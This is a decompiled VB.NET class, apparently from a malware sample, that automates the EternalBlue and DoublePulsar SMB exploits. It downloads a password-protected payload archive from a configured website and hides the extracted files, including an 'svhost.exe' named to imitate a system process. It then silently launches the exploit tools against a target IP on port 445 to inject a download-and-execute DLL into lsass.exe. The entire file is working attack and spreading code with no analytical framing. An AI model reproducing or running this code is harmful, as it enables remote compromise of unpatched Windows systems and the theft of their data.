Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Windows.Forms
Imports Ionic.Zip
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x02000032 RID: 50
	Friend Class DoublePulsar
		' Token: 0x06000121 RID: 289 RVA: 0x0000B028 File Offset: 0x00009228
		Public Shared Sub InitializeDP()
			Try
				DoublePulsar.ionic_zip()
				DoublePulsar.DownloadPayloadFromWebSite(Config.PayloadStorageWebsiteLink + Config.DoublePulsarPayloadFile)
				DoublePulsar.UnzipPayload()
			Catch
			End Try
		End Sub

		' Token: 0x06000122 RID: 290 RVA: 0x0000B06C File Offset: 0x0000926C
		Public Shared Sub DownloadPayloadFromWebSite(payloadPath As String)
			Try
				Using webClient As WebClient = New WebClient()
					webClient.DownloadFile(payloadPath, DoublePulsar.DestDir)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000123 RID: 291 RVA: 0x0000B0BC File Offset: 0x000092BC
		Public Shared Sub ionic_zip()
			Try
				Dim ionic_Zip As Byte() = Resources.Ionic_Zip
				Using fileStream As FileStream = New FileStream(Path.GetDirectoryName(Application.ExecutablePath) + "\Ionic.Zip.dll", FileMode.OpenOrCreate)
					fileStream.Write(ionic_Zip, 0, ionic_Zip.Length)
					File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\Ionic.Zip.dll", File.GetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\Ionic.Zip.dll") Or FileAttributes.Hidden Or FileAttributes.System)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000124 RID: 292 RVA: 0x0000B15C File Offset: 0x0000935C
		Private Shared Sub UnzipPayload()
			New ZipFile(Config.DoublePulsarPayloadFile) With { .Password = Config.DoublePulsarPayloadFilePass }.ExtractAll(Path.GetDirectoryName(Application.ExecutablePath) + "\", 1)
			File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\logs", FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\Dlls", FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\files", FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes(Config.DoublePulsarPayloadFile, FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes("svhost.exe", FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes("himem_x86.exe", FileAttributes.Hidden Or FileAttributes.System)
			File.SetAttributes("himem_x64.exe", FileAttributes.Hidden Or FileAttributes.System)
		End Sub

		' Token: 0x06000125 RID: 293 RVA: 0x0000B214 File Offset: 0x00009414
		Public Shared Sub DeliverPayload(Optional IP As String = "127.0.0.1", Optional Port As String = "445", Optional PayloadFile As String = "download_exec_dll_64.dll", Optional [Function] As String = "RunDLL", Optional ProcessName As String = "lsass.exe", Optional Architecture As String = "x64", Optional Protocol As String = "SMB", Optional TargetOS As String = "WIN72K8R2")
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "cmd.exe", .Arguments = String.Concat(New String() { "/c ", Path.GetDirectoryName(Application.ExecutablePath), "\files\etb.exe --InConfig ", Path.GetDirectoryName(Application.ExecutablePath), "\files\Eternalblue-2.2.0.xml --TargetIp ", IP, " --TargetPort ", Port, " --OutConfig ", Path.GetDirectoryName(Application.ExecutablePath), "\logs\EB_", IP, "_", Port, ".txt --Target ", TargetOS }) } }.Start()
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "cmd.exe", .Arguments = String.Concat(New String() { "/c ", Path.GetDirectoryName(Application.ExecutablePath), "\files\dobp.exe --InConfig ", Path.GetDirectoryName(Application.ExecutablePath), "\files\Doublepulsar-1.3.1.xml --TargetIp ", IP, " --TargetPort ", Port, " --OutConfig ", Path.GetDirectoryName(Application.ExecutablePath), "\logs\DP_", IP, "_", Port, ".txt --Protocol ", Protocol, " --Architecture ", Architecture, " --Function ", [Function], " --DllPayload ", Path.GetDirectoryName(Application.ExecutablePath), "\Dlls\", PayloadFile, " --payloadDllOrdinal 1 --ProcessName ", ProcessName, " --ProcessCommandLine """" --NetworkTimeout 60" }) } }.Start()
			Catch
			End Try
		End Sub

		' Token: 0x040000DA RID: 218
		Private Shared DestDir As String = Path.GetDirectoryName(Application.ExecutablePath) + "\" + Config.DoublePulsarPayloadFile
	End Class
End Namespace
